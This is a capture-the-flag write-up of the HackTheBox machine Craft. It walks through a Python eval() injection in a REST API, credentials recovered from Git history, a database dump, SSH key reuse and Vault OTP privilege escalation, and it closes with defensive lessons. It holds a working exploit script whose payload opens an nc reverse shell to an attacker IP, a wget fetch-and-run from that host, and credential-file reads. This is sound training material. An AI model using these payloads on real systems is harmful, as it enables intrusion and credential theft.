# Craft — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Craft |
| OS | Linux (Debian 4.9.0-8-amd64) |
| Difficulty | Medium |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.85.109` |
| Domains | `craft.htb`, `api.craft.htb`, `gogs.craft.htb`, `vault.craft.htb` |
| Tools Used | Nmap, Python, pymysql, netcat, rlwrap, vault CLI |
| CVEs / Techniques | Python `eval()` injection on REST API, Gogs commit history credential exposure, HashiCorp Vault SSH OTP engine abuse |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — Python eval() Injection](#foothold--python-eval-injection)
- [Container Enumeration](#container-enumeration)
- [Lateral Movement — Gogs to SSH](#lateral-movement--gogs-to-ssh)
- [Privilege Escalation — HashiCorp Vault SSH OTP](#privilege-escalation--hashicorp-vault-ssh-otp)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full-port + service-version scan | Ports 22 (SSH), 443 (HTTPS/nginx), 6022 (Gogs SSH) discovered |
| 2 | Virtual host registration | `craft.htb`, `api.craft.htb`, `gogs.craft.htb` all resolve |
| 3 | Gogs public repo enumeration — `Craft/craft-api` | Open issue exposes API token; codebase accessible |
| 4 | Git commit history review — `brew.py` diff by Dinesh | `eval()` injection via `abv` field identified |
| 5 | Commit `10e3ba4f0a` — test script with credentials | `dinesh:4aUh0A8PbVJxgd` recovered from history |
| 6 | Python eval injection via crafted API request | Reverse shell as `root` inside Docker container |
| 7 | Container filesystem enumeration — `settings.py` | MySQL credentials: `craft:qLGockJ6G2J75O` |
| 8 | Custom pymysql script deployed to container | `user` table dumped: dinesh, ebachman, gilfoyle credentials |
| 9 | Gogs login as `gilfoyle` using DB password | Private `craft-infra` repository discovered |
| 10 | `craft-infra/.ssh/id_rsa` retrieved | Gilfoyle's encrypted SSH private key recovered |
| 11 | SSH login as `gilfoyle` — key passphrase = DB password | `user.txt` captured |
| 12 | Home directory enumeration — `.vault-token` discovered | HashiCorp Vault token found |
| 13 | `craft-infra/vault/secrets.sh` reviewed on Gogs | Vault role `root_otp` configured for `root` SSH access |
| 14 | `vault ssh -role root_otp -mode otp root@10.129.85.109` | OTP generated → SSH as `root` → `root.txt` captured |

---

## Reconnaissance

### Step 1 — Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn --open -p- -T4 10.129.85.109
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11
```

Three ports open. Port 6022 is flagged as `x11` by default fingerprinting — this is incorrect. The version scan confirms it is a Golang SSH service (Gogs).

---

### Step 2 — Service Version Detection

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sS -sV -sC -T4 -O -p 22,443,6022 -Pn 10.129.85.109 -oA Craft
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 7.4p1 | Standard OS SSH — Debian 10 |
| 443 | nginx 1.15.8 (TLS) | SSL cert CN: `craft.htb` → virtual host required |
| 6022 | Golang SSH | **Gogs** serving its own SSH interface |

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.85.109 craft.htb api.craft.htb gogs.craft.htb" | sudo tee -a /etc/hosts
```

---

### Step 3 — HTTPS and Gogs Enumeration

Browsing to `https://craft.htb` reveals the Craft homepage — a REST API for US craft beers. Two icons link to `api.craft.htb` and `gogs.craft.htb`.

`https://gogs.craft.htb` reveals a self-hosted **Gogs** instance (version `0.11.86.0130`). The public repository `Craft/craft-api` contains the API backend source code.

> **Key concept:** Self-hosted Git servers (Gogs, Gitea, GitLab) are extremely high-value targets. Public repositories on them frequently contain hardcoded credentials, API tokens, and unredacted commit history. Always enumerate every public repo and its complete commit history.

---

## Foothold — Python eval() Injection

### Step 4 — Gogs Issue and Commit Analysis

The `Craft/craft-api` repository has one open issue (**Issue #2**, by `dinesh`). The comment contains a raw `curl` command with an API token embedded in `X-Craft-API-Token`. The issue references commit `c414b16057` as the “fix”. That commit diff reveals:

```python
# Commit c414b16057 — brew.py
# REMOVED:
-    create_brew(request.json)
-    return None, 201

# ADDED:
+    if eval('%s > 1' % request.json['abv']):
+        return "ABV must be a decimal value less than 1.0", 400
+    else:
+        create_brew(request.json)
+        return None, 201
```

**The vulnerability:** Python's `eval()` executes the string `'<user_input> > 1'` as live Python code. The `abv` field is an arbitrary Python code execution point.

```python
# Intended use
>>> eval('0.5 > 1')
False

# What an attacker can do
>>> eval("__import__('os').system('whoami')")
root
```

> `__import__()` is Python's built-in dynamic import function — a valid expression inside `eval()` where `import os` (a statement) is not. This is why `eval("__import__('os').system('id')")` works while `eval("import os; os.system('id')")` does not.

---

### Step 5 — Credential Recovery from Commit History

Commit `10e3ba4f0a` by Dinesh (“add test script”) added `tests/test.py` containing hardcoded credentials:

```python
response = requests.get('https://api.craft.htb/api/auth/login',
    auth=('dinesh', '4aUh0A8PbVJxgd'),
    verify=False)
```

| Username | Password | Source |
|----------|----------|--------|
| `dinesh` | `4aUh0A8PbVJxgd` | `tests/test.py` — commit `10e3ba4f0a` |

> **Key concept:** Commit history is permanent. Even if a file is deleted in a later commit, credentials in the original commit are accessible forever via `git show <hash>`. Tools like `trufflehog` and `gitleaks` automate this search.

---

### Step 6 — Reverse Shell via eval() Injection

The test script was modified to exploit the `eval()` vulnerability:

```python
#!/usr/bin/env python

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get('https://api.craft.htb/api/auth/login',
    auth=('dinesh', '4aUh0A8PbVJxgd'),
    verify=False)

json_response = json.loads(response.text)
token = json_response['token']

headers = {
    'X-Craft-API-Token': token,
    'Content-Type': 'application/json'
}

# eval() injection payload
brew_dict = {}
brew_dict['abv']    = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.36 4444 >/tmp/f')"
brew_dict['name']   = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style']  = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/',
    headers=headers, data=json_data, verify=False)
print(response.text)
```

**The mkfifo reverse shell explained:**
```
rm /tmp/f          — remove any existing named pipe
mkfifo /tmp/f      — create a FIFO named pipe
cat /tmp/f         — read from it (blocks, waiting for input)
| /bin/sh -i       — pipe to an interactive shell
2>&1               — merge stderr into stdout
| nc 10.10.16.36 4444  — send output to attacker
>/tmp/f            — redirect attacker input back into the pipe
```

```bash
Hackerpatel007_1@htb[/htb]$ rlwrap nc -lvnp 4444
Hackerpatel007_1@htb[/htb]$ python exploit.py
```

```
Connection from 10.129.85.109 received!
/opt/app # id
uid=0(root) gid=0(root) groups=0(root)
```

Shell obtained as `root` — but this is `root` **inside a Docker container**, not on the host.

---

## Container Enumeration

### Step 7 — Confirming Container Context and Finding Database Credentials

```bash
/opt/app # ls /
# .dockerenv present — definitive Docker container indicator
```

The `.dockerenv` file at the filesystem root confirms Docker container context. Container `root` (uid=0) has full control over the container filesystem but is isolated from the host — lateral movement via credentials is the path forward.

```bash
/opt/app # cat craft_api/settings.py
```

```python
MYSQL_DATABASE_USER     = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB       = 'craft'
MYSQL_DATABASE_HOST     = 'db'
```

| Field | Value |
|-------|-------|
| Username | `craft` |
| Password | `qLGockJ6G2J75O` |
| Host | `db` (Docker internal hostname) |

The `db` host is container-internal — not reachable from outside. Queries must be run from within the container using the pymysql library already available.

---

### Step 8 — Database Enumeration via Custom pymysql Script

**Phase 1 — List tables** (script placed in `/opt/app` so `from craft_api import settings` resolves):

```python
import pymysql
from craft_api import settings

connection = pymysql.connect(
    host=settings.MYSQL_DATABASE_HOST,
    user=settings.MYSQL_DATABASE_USER,
    password=settings.MYSQL_DATABASE_PASSWORD,
    db=settings.MYSQL_DATABASE_DB,
    cursorclass=pymysql.cursors.DictCursor
)

try:
    with connection.cursor() as cursor:
        cursor.execute("show tables")
        print(cursor.fetchall())
finally:
    connection.close()
```

```
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
```

**Phase 2 — Dump the `user` table:**

```bash
# Transfer via HTTP server on attacker machine
python3 -m http.server 80
/opt/app # wget 10.10.16.36/get_user.py
/opt/app # python get_user.py
```

```
[
  {'id': 1, 'username': 'dinesh',   'password': '4aUh0A8PbVJxgd'},
  {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
  {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
]
```

| Username | Password |
|----------|----------|
| `dinesh` | `4aUh0A8PbVJxgd` |
| `ebachman` | `llJ77D8QFkLPQB` |
| `gilfoyle` | `ZEU3N8WNM2rh4T` |

---

## Lateral Movement — Gogs to SSH

### Step 9 — Gogs Login as Gilfoyle

OS SSH login attempts with all three passwords fail. However, `gilfoyle:ZEU3N8WNM2rh4T` authenticates to `https://gogs.craft.htb/user/login`. Gilfoyle's profile reveals a **private repository** not visible to unauthenticated users: `gilfoyle/craft-infra`.

> **Key concept:** Credentials found in a database dump should be tested against all services on the target. Database password → Gogs login → private repository access is a credential reuse chain that would be missed by testing SSH alone.

---

### Step 10 — SSH Private Key Recovery from craft-infra Repository

The `craft-infra` repository contains `gilfoyle/.ssh/id_rsa` and `id_rsa.pub` committed directly into version control.

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
```

> **Key concept:** SSH private keys should never be committed to version control, even in private repositories. Access to the repository is the only barrier between an attacker and the key. Private repositories on self-hosted Git servers are only as private as the access controls on those servers.

---

## User Flag

### Step 11 — SSH Login as gilfoyle

The private key is password-protected. The SSH agent prompts for the key passphrase — Gilfoyle's database password works:

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa gilfoyle@10.129.85.109
```

```
Enter passphrase for key 'id_rsa': ZEU3N8WNM2rh4T

Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
gilfoyle@craft:~$
```

```bash
gilfoyle@craft:~$ cat user.txt
0967053f53f318ca13b5deb31fa636e0
```

The credential reuse chain is complete: **database password → Gogs password → SSH key passphrase**.

---

## Privilege Escalation — HashiCorp Vault SSH OTP

### Step 12 — .vault-token Discovery

```bash
gilfoyle@craft:~$ ls -la
```

```
-rw------- 1 gilfoyle gilfoyle   36 Feb  9 2019 .vault-token
```

```bash
gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c4-9651c4713185
```

**HashiCorp Vault** is a secrets management tool. Its SSH Secrets Engine can generate One-Time Passwords (OTPs) to allow controlled SSH access to target machines, eliminating long-lived root passwords. The `.vault-token` file contains Gilfoyle's Vault authentication token — stored on disk in plaintext.

---

### Step 13 — Vault SSH Configuration (craft-infra Repository)

Back in Gilfoyle's `craft-infra` Gogs repository, `vault/secrets.sh` reveals the Vault configuration:

```bash
#!/bin/bash
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

| Parameter | Value | Meaning |
|-----------|-------|---------|
| `ssh/roles/root_otp` | Role name | Vault role named `root_otp` |
| `key_type=otp` | OTP mode | One-use password per SSH session |
| `default_user=root` | Target user | OTP valid for SSH as `root` |
| `cidr_list=0.0.0.0/0` | Any IP | No source IP restriction |

**How Vault SSH OTP works:**
1. Gilfoyle's token authorises him to request credentials from `root_otp`
2. `vault ssh -role root_otp -mode otp root@<host>` generates a random OTP
3. Vault injects the OTP into the SSH configuration via `vault-ssh-helper` as a valid root password
4. The OTP is consumed on first use and cannot be reused

The weakness: Gilfoyle's token is stored in plaintext in `.vault-token`, and it has permission to request root OTPs.

---

### Step 14 — Root Access via Vault OTP

```bash
gilfoyle@craft:~$ export VAULT_ADDR=https://vault.craft.htb:8200
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.129.85.109
```

```
Vault could not locate "sshpass". The OTP code for the session is:
OTP for the session is: 15852513-dac3-e31d-2816-0bbe62b473c0

Password: [OTP entered]

root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@craft:~# cat /root/root.txt
16e226826df289d713bcf191cabb25d3
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `0967053f53f318ca13b5deb31fa636e0` |
| Root Flag | `16e226826df289d713bcf191cabb25d3` |

---

## Lessons Learned

1. **Git commit history is a permanent credential store until the entire repository history is rewritten.** Dinesh committed `tests/test.py` containing plaintext credentials and never purged them from history. Even deleted files remain accessible via `git show <hash>`. Tools like `trufflehog` and `gitleaks` automate credential discovery in commit history. Always review every diff in every accessible repository.

2. **Python's `eval()` on unsanitised user input is unconditional Remote Code Execution.** `eval('%s > 1' % request.json['abv'])` made the entire `abv` field an arbitrary Python execution point. `eval()` has no sandboxing — it can import modules, spawn processes, read files, and make network connections. The correct fix is `float(request.json['abv']) > 1`. Any `eval()`, `exec()`, or `compile()` call on user-controlled data is a critical finding.

3. **`__import__()` bypasses restrictions that filter `import` statements inside `eval()`.** `import os` is a statement — not valid inside `eval()`. `__import__('os')` is a built-in function call — a valid expression. Knowing this pattern is essential for exploiting Python eval injections.

4. **Container `root` enables deep lateral movement without a container escape.** Landing in Docker as `root` gave access to source code, settings files, and — critically — the ability to query the internal MySQL container. The `db` Docker hostname is not reachable from outside the network, but the container is on the same bridge and reaches it directly. Internal Docker networks create lateral movement paths invisible from outside.

5. **Credentials from application databases must be tested against all services, not just SSH.** `gilfoyle:ZEU3N8WNM2rh4T` failed SSH but succeeded on Gogs, unlocking a private repo containing his SSH key, which used the same password as its passphrase. A single credential opened three surfaces: database → Gogs → SSH key passphrase.

6. **Private repositories on self-hosted Git servers are only as private as the server’s access controls.** Once authenticated as `gilfoyle`, `craft-infra` was fully readable. Private repositories frequently contain infrastructure secrets that would never reach a public GitHub: SSH keys, Vault tokens, kubeconfig files, Terraform state, internal API keys. Any authenticated Git access should be followed by enumerating all private repositories.

7. **SSH private keys committed to version control are permanently compromised.** Even password-protected, the key material is in the git history forever. Revoke and replace any key that has been committed, regardless of the repository's privacy setting.

8. **HashiCorp Vault SSH OTP is a strong PAM design — but Vault tokens in plaintext defeat it.** The OTP architecture eliminates long-lived root passwords entirely. The failure was storing Gilfoyle's token in `.vault-token` with `600` permissions. Any process or attacker who gains access to that account reads and uses the token. Vault tokens should be treated as passwords and never stored in plaintext on the filesystem when they grant access to privileged account credentials.

---

## Full Attack Chain Reference

```
[Attacker: 10.10.16.36]
        ↓
Nmap: ports 22 (SSH), 443 (HTTPS/nginx), 6022 (Gogs SSH) open
        ↓
/etc/hosts: craft.htb, api.craft.htb, gogs.craft.htb → 10.129.85.109
        ↓
gogs.craft.htb → Craft/craft-api public repository (Gogs 0.11.86.0130)
        ↓
Issue #2 (dinesh): API token leaked in public issue
        ↓
Commit c414b16057 (dinesh): eval('%s > 1' % abv) — Python eval() injection
        ↓
Commit 10e3ba4f0a (dinesh): test.py — dinesh:4aUh0A8PbVJxgd hardcoded
        ↓
exploit.py: abv = "__import__('os').system('mkfifo /tmp/f;...|nc 10.10.16.36 4444')"
        ↓
Reverse shell: root@container (Docker, /opt/app)
        ↓
/opt/app/craft_api/settings.py: craft:qLGockJ6G2J75O (MySQL creds)
        ↓
get_user.py (pymysql): SELECT * FROM user
  └── dinesh:4aUh0A8PbVJxgd | ebachman:llJ77D8QFkLPQB | gilfoyle:ZEU3N8WNM2rh4T
        ↓
Gogs login: gilfoyle:ZEU3N8WNM2rh4T → gilfoyle/craft-infra (private repo)
        ↓
craft-infra/.ssh/id_rsa — encrypted SSH private key (passphrase = ZEU3N8WNM2rh4T)
        ↓
ssh -i id_rsa gilfoyle@10.129.85.109 [User Flag: 0967053f53f318ca13b5deb31fa636e0]
        ↓
~/.vault-token: f1783c8d-41c7-0b12-d1c4-9651c4713185
        ↓
craft-infra/vault/secrets.sh:
  vault write ssh/roles/root_otp key_type=otp default_user=root
        ↓
vault ssh -role root_otp -mode otp root@10.129.85.109
  └── OTP generated → entered at SSH password prompt
        ↓
root@craft [Root Flag: 16e226826df289d713bcf191cabb25d3]
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn --open -p- -T4 10.129.85.109` | Full TCP port scan |
| `sudo nmap -sS -sV -sC -T4 -O -p 22,443,6022 -Pn 10.129.85.109 -oA Craft` | Service version + OS detection |
| `echo "10.129.85.109 craft.htb api.craft.htb gogs.craft.htb" \| sudo tee -a /etc/hosts` | Register all three virtual hosts |
| `wget --no-check-certificate https://gogs.craft.htb/Craft/craft-api/raw/<hash>/tests/test.py` | Download test script from Gogs commit history |
| `rlwrap nc -lvnp 4444` | Start listener for reverse shell |
| `python exploit.py` | Fire eval() injection → reverse shell |
| `cat /opt/app/craft_api/settings.py` | Read MySQL credentials from application settings |
| `python3 -m http.server 80` | Serve pymysql enumeration script to container |
| `wget 10.10.16.36/get_user.py && python get_user.py` | Transfer and run DB enumeration inside container |
| `chmod 600 id_rsa && ssh -i id_rsa gilfoyle@10.129.85.109` | SSH login using key from craft-infra repo |
| `cat ~/.vault-token` | Read Vault authentication token |
| `export VAULT_ADDR=https://vault.craft.htb:8200` | Point Vault CLI at the Vault server |
| `vault ssh -role root_otp -mode otp root@10.129.85.109` | Generate OTP and SSH as root via Vault |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap full-port and service-version scan against 10.129.85.109 |
| T1593 | T1593.003 | Enumeration of public Gogs repository `Craft/craft-api` for credentials and vulnerabilities |
| T1552 | T1552.001 | `dinesh:4aUh0A8PbVJxgd` recovered from `tests/test.py` in Git commit history |
| T1059 | T1059.006 | Python `eval()` injection via `abv` field in POST `/api/brew/` — arbitrary code execution |
| T1190 | — | Exploiting Python `eval()` on unsanitised REST API input to achieve RCE |
| T1083 | — | Container filesystem enumeration: `/opt/app`, `settings.py`, `dbtest.py` |
| T1552 | T1552.001 | MySQL credentials `craft:qLGockJ6G2J75O` recovered from `craft_api/settings.py` |
| T1005 | — | Custom pymysql script executes `SELECT * FROM user` against internal MySQL container |
| T1078 | T1078.003 | Gogs login as `gilfoyle` using database password; SSH private key retrieved from private repo |
| T1552 | T1552.004 | SSH private key (`id_rsa`) committed to `gilfoyle/craft-infra` Gogs repository |
| T1021 | T1021.004 | SSH login as `gilfoyle` using key from Gogs private repo + DB password as passphrase |
| T1555 | — | `.vault-token` read from gilfoyle’s home directory — Vault API token recovered |
| T1548 | — | Vault SSH OTP engine: `vault ssh -role root_otp` generates root OTP for SSH login |

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
